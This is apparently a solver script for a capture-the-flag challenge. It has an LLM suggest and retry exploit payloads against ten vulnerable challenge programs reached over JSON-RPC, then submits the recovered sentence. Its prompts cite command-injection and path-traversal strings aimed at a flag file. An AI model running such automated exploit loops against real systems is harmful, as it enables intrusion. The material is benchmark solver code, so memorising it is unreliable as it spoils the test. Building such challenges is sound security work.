"""
Waikness solver: exploit 10 vulnerable programs to recover a 10-word sentence.
"""

import json
import os
import time
from typing import Any

import requests  # type: ignore[import-not-found]


def _env(name: str, default: str | None = None) -> str:
    v = os.environ.get(name)
    if v is None or v == "":
        if default is None:
            raise RuntimeError(f"Missing required env var: {name}")
        return default
    return v


def jsonrpc(url: str, method: str, params: dict[str, Any] | None = None, _id: int = 1) -> dict[str, Any]:
    payload: dict[str, Any] = {"jsonrpc": "2.0", "id": _id, "method": method}
    if params is not None:
        payload["params"] = params
    resp = requests.post(url, json=payload, timeout=15)
    resp.raise_for_status()
    data = resp.json()
    if "error" in data:
        raise RuntimeError(f"JSON-RPC error: {data['error']}")
    return data


def tools_call(url: str, name: str, arguments: dict[str, Any]) -> str:
    res = jsonrpc(url, "tools/call", {"name": name, "arguments": arguments}, _id=99)
    return res["result"]["content"][0]["text"]


def suggest_exploit_retry(
    base_url: str, api_key: str | None, model: str, code: str, prev_payload: str, prev_output: str
) -> str:
    """Ask LLM for alternative exploit given previous failure."""
    url = base_url.rstrip("/") + "/v1/chat/completions"
    headers: dict[str, str] = {"Content-Type": "application/json"}
    if api_key:
        headers["Authorization"] = f"Bearer {api_key}"
    payload = {
        "model": model,
        "temperature": 0.3,
        "messages": [
            {
                "role": "system",
                "content": (
                    "You suggest exploit payloads for vulnerable code. Return STRICT JSON: {\"payload\": \"...\"}.\n"
                    "If the previous attempt failed, try a different approach (e.g. different injection, path)."
                ),
            },
            {
                "role": "user",
                "content": f"Code:\n{code}\n\nPrevious payload {prev_payload!r} produced: {prev_output[:200]!r}. Try another.",
            },
        ],
        "response_format": {"type": "json_object"},
    }
    resp = requests.post(url, headers=headers, json=payload, timeout=45)
    resp.raise_for_status()
    data = resp.json()
    obj = json.loads(data["choices"][0]["message"]["content"])
    return str(obj.get("payload", "")).strip().strip('"')


def suggest_exploit(base_url: str, api_key: str | None, model: str, code: str) -> str:
    """Use LLM to suggest an exploit payload for the vulnerable code."""
    url = base_url.rstrip("/") + "/v1/chat/completions"
    headers: dict[str, str] = {"Content-Type": "application/json"}
    if api_key:
        headers["Authorization"] = f"Bearer {api_key}"
    payload = {
        "model": model,
        "temperature": 0.0,
        "messages": [
            {
                "role": "system",
                "content": (
                    "You analyze vulnerable code and suggest an exploit payload.\n"
                    "Return STRICT JSON: {\"payload\": \"the exploit string to pass as argv[1]\"}.\n"
                    "Common patterns: command injection (e.g. '; cat /flag'), path traversal (e.g. '../../../flag').\n"
                    "No explanation, only the JSON."
                ),
            },
            {"role": "user", "content": f"Vulnerable code:\n\n{code}"},
        ],
        "response_format": {"type": "json_object"},
    }
    resp = requests.post(url, headers=headers, json=payload, timeout=45)
    resp.raise_for_status()
    data = resp.json()
    content = data["choices"][0]["message"]["content"]
    obj = json.loads(content)
    return str(obj.get("payload", "")).strip().strip('"')


def main() -> None:
    challenges_url = _env("MCP_CHALLENGES_URL") + "/rpc"
    flag_url = _env("MCP_FLAG_URL") + "/rpc"

    jsonrpc(challenges_url, "initialize", {"clientInfo": {"name": "waikness-solver", "version": "1.0"}}, _id=1)
    jsonrpc(flag_url, "initialize", {"clientInfo": {"name": "waikness-solver", "version": "1.0"}}, _id=2)

    ids_text = tools_call(challenges_url, "get_challenge_ids", {})
    ids = json.loads(ids_text)
    print(f"[solve] Challenge IDs: {ids}")

    base_url = os.environ.get("LITELLM_BASE_URL", "http://litellm:4000")
    api_key = os.environ.get("TEAM_LITELLM_API_KEY") or None
    model = os.environ.get("TEAM_LITELLM_MODEL") or os.environ.get("LITELLM_MODEL", "gpt-4o-mini")

    words: list[str] = [""] * 10
    for i, cid in enumerate(ids):
        code = tools_call(challenges_url, "get_challenge_code", {"challenge_id": str(cid)})
        payload = suggest_exploit(base_url, api_key, model, code)
        print(f"[solve] Challenge {cid}: trying payload {payload!r}")

        for attempt in range(30):
            result = tools_call(challenges_url, "run_challenge", {"challenge_id": str(cid), "payload": payload})
            if result == "Temporary failure":
                print(f"[solve] Challenge {cid}: temporary failure, retry {attempt + 1}")
                time.sleep(0.5)
                continue
            # Success: "OK: [word]"
            if result.startswith("OK: [") and result.endswith("]"):
                word = result[5:-1]
                words[i] = word
                print(f"[solve] Challenge {cid}: got word {word!r}")
                break
            # Error output - ask LLM for alternative payload
            print(f"[solve] Challenge {cid}: got error, trying alternative payload")
            payload = suggest_exploit_retry(base_url, api_key, model, code, payload, result)
            time.sleep(0.3)
        else:
            print(f"[solve] Challenge {cid}: failed after retries")
            words[i] = "unknown"

    sentence = " ".join(w for w in words if w)
    print(f"[solve] Submitting sentence: {sentence!r}")

    response = tools_call(flag_url, "submit_sentence", {"sentence": sentence})
    print(response)


if __name__ == "__main__":
    main()
